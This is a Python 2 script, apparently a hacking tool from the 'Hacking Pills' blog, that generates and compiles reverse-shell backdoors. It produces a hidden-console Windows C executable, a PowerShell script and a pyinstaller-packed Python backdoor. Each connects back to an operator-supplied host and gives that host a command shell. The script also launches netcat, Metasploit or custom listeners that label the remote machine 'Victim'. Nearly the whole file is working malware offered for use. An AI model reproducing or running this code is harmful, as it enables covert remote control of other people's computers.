#! /usr/bin/python
# -*- coding: utf-8 -*-

import os
import io
import sys
from optparse import OptionParser
import back
import time
import socket
import subprocess

global term
term = back.TerminalController()

class bcolors:
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    RED = '\033[31m'
    YELLOW = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    BGRED = '\033[41m'
    WHITE = '\033[37m'



def Backdoor(host,port,name):

    with io.FileIO(""+name+".c", "w") as file:
           file.write('''
#include <winsock2.h>
#include <stdio.h>

#define _WINSOCK_DEPRECATED_NO_WARNINGS

#pragma comment(lib,"ws2_32")

  WSADATA wsaData;
  SOCKET Winsock;
  SOCKET Sock;
  struct sockaddr_in hax;
  char ip[16];
  STARTUPINFO ini_processo;
  PROCESS_INFORMATION processo_info;

//int main(int argc, char *argv[])
int WINAPI WinMain (HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR szCmdParam, int iCmdShow)
{

    FreeConsole();

    WSAStartup(MAKEWORD(2,2), &wsaData);
    Winsock=WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,(unsigned int)NULL,(unsigned int)NULL);

    struct hostent *host;
    host = gethostbyname("'''+host+'''");
    strcpy(ip, inet_ntoa(*((struct in_addr *)host->h_addr)));

    hax.sin_family = AF_INET;
    hax.sin_port = htons(atoi("'''+port+'''"));
    hax.sin_addr.s_addr = inet_addr(ip);

    WSAConnect(Winsock,(SOCKADDR*)&hax,sizeof(hax),NULL,NULL,NULL,NULL);

    memset(&ini_processo,0,sizeof(ini_processo));
    ini_processo.cb=sizeof(ini_processo);
    ini_processo.dwFlags=STARTF_USESTDHANDLES;
    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;
    CreateProcess(NULL,"cmd.exe",NULL,NULL,TRUE,CREATE_NO_WINDOW,NULL,NULL,&ini_processo,&processo_info);
}

''')

def shell(host,port,name):
   with io.FileIO(""+name+".ps1", "w") as file:
           file.write('''
function cleanup {
if ($client.Connected -eq $true) {$client.Close()}
if ($process.ExitCode -ne $null) {$process.Close()}
exit}
// Setup IPADDR
$address = "'''+host+'''"
// Setup PORT
$port = "'''+port+'''"
$client = New-Object system.net.sockets.tcpclient
$client.connect($address,$port)
$stream = $client.GetStream()
$networkbuffer = New-Object System.Byte[] $client.ReceiveBufferSize
$process = New-Object System.Diagnostics.Process
$process.StartInfo.FileName = 'C:\\windows\\system32\\cmd.exe'
$process.StartInfo.RedirectStandardInput = 1
$process.StartInfo.RedirectStandardOutput = 1
$process.StartInfo.UseShellExecute = 0
$process.Start()
$inputstream = $process.StandardInput
$outputstream = $process.StandardOutput
Start-Sleep 1
$encoding = new-object System.Text.AsciiEncoding
while($outputstream.Peek() -ne -1){$out += $encoding.GetString($outputstream.Read())}
$stream.Write($encoding.GetBytes($out),0,$out.Length)
$out = $null; $done = $false; $testing = 0;
while (-not $done) {
if ($client.Connected -ne $true) {cleanup}
$pos = 0; $i = 1
while (($i -gt 0) -and ($pos -lt $networkbuffer.Length)) {
$read = $stream.Read($networkbuffer,$pos,$networkbuffer.Length - $pos)
$pos+=$read; if ($pos -and ($networkbuffer[0..$($pos-1)] -contains 10)) {break}}
if ($pos -gt 0) {
$string = $encoding.GetString($networkbuffer,0,$pos)
$inputstream.write($string)
start-sleep 1
if ($process.ExitCode -ne $null) {cleanup}
else {
$out = $encoding.GetString($outputstream.Read())
while($outputstream.Peek() -ne -1){
$out += $encoding.GetString($outputstream.Read()); if ($out -eq $string) {$out = ''}}
$stream.Write($encoding.GetBytes($out),0,$out.length)
$out = $null
$string = $null}} else {cleanup}}


 ''')



def Pybackdoor(host,port):
    with io.FileIO("Pymoon.py", "w") as file:
           file.write('''#!/usr/bin/env python
import socket
import os
import commands
 

def comandos(data):
    
  clientsocket.send(";)")

clientsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

  
clientsocket.connect(("'''+host+'''",'''+port+'''))



while True:
        data = clientsocket.recv(1024) 
        respuesta = commands.getoutput(data)
        clientsocket.send(respuesta)

        if not respuesta:comandos(data)


''')  

  

def lister1(host,port):
     print "Start Listerner in "+bcolors.BOLD+bcolors.GREEN+host +":"+ port +bcolors.ENDC+bcolors.ENDC
     os.system("nc -l -v -n  -p "+port)

def lister2(host,port):
    os.system('msfconsole -x "use multi/handler;\set LHOST '+host+';\set LPORT '+port+';\set PAYLOAD windows/shell_reverse_tcp;\exploit -j"')

def listener3(host,port):


    serversocket    =   socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    serversocket.bind((host, int(port)))

    serversocket.listen(1)




    print "\033[1;36mEsperando conexion...\033[1;m"
    clientsocket, clientaddress = serversocket.accept()

    print 'Conexion desde: ', clientaddress 


    while True:
    
        data = raw_input(bcolors.GREEN+':~# '+bcolors.ENDC)

        if data == "exit":
          print bcolors.RED+"Bye..."+bcolors.ENDC
          break

        elif data == "clear":
          os.system("clear")
        else:

            clientsocket.send(data) 
            data = clientsocket.recv(1024) 
    
            print '\033[1;91mVictim: \033[1;m\n%s' % data    

            if not data:break
          

    clientsocket.close() 


def main():
        parser=OptionParser()
        parser.add_option("-i", "--host",dest="host",type="string",help="your IP",metavar="IP")
        parser.add_option("-p", "--port",dest="port",type="string",help="your Port",metavar="Port")
        parser.add_option("-r", "--path",dest="path",type="string", help="script path",metavar="path", default="/root/Desktop")
        parser.add_option("-n", "--name",dest="name",type="string",help="backdoor name",metavar="name",default="D-moon")
        parser.add_option("-t",dest="type",type="string",help="attacks: backdoor, pybackdoor, powershell",metavar="attack")
        parser.add_option("-l",dest="listen",type="string",help="handler-modes: windows, linux, shell",metavar="listener")


        options, args=parser.parse_args()



        if options.type == 'backdoor':
           Backdoor(options.host, options.port, options.name)
           compile(options.path,options.name)
           lister1(options.host,options.port)

        elif options.type == 'pybackdoor':
              Pybackdoor(options.host,options.port)
              compile2()
              listener3(options.host,options.port)

        elif options.type == 'powershell':
             shell(options.host,options.port,options.name)
             lister2(options.host,options.port)

        elif options.listen == "windows":
             lister1(options.host,options.port)

        elif options.listen == "shell":
             lister2(options.host,options.port)

        elif options.listen == "linux":
             listener3(options.host,options.port)




       

        else:
           parser.print_help()
           print bcolors.BOLD+bcolors.RED+"\nTypes of attacks:\n\n1.Windows backdoor [-i,-p,-n,-r]\n2.Linux & Mac PYBackdoor [-i,-p]\n3.Power shell attack [-i,-p,-n]"+bcolors.ENDC+bcolors.ENDC
           print "\nAbout:"
           print "\033[1;36m● Twitter: @Sh4Rk_0\033[1;m"
           print bcolors.BLUE+"● Facebook: Hacking Pills"+bcolors.ENDC
           print bcolors.GREEN+"● Blog: hackingpills.blogspot.com\n"+bcolors.ENDC

def compile(path,name):
  print "Generate Baackdoor."
  clock = "#"

  for i in range (30):
      time.sleep(0.1)
      sys.stdout.write(bcolors.GREEN+"#"+bcolors.ENDC + clock[i % len (clock)])
      sys.stdout.flush()
  print "\033[1;36m[Done]\033[1;m"
  print "\n"
  

  os.system("/usr/bin/i686-w64-mingw32-gcc D-moon.c -o "+path+"/D-moon.exe -lws2_32")
  os.system("rm D-moon.c")

  print "\033[1;36m[Backdoor Ready...]\033[1;m\n"

def compile2():
  
  call = subprocess.call(["pyinstaller", "--onefile", "Pymoon.py"])
  os.system("rm -R build")
  os.system("rm Pymoon.spec")
  os.system("rm Pymoon.py")
  os.system("clear")


if __name__=="__main__":
   back.header()
   os.remove("back.pyc")
   main()
   
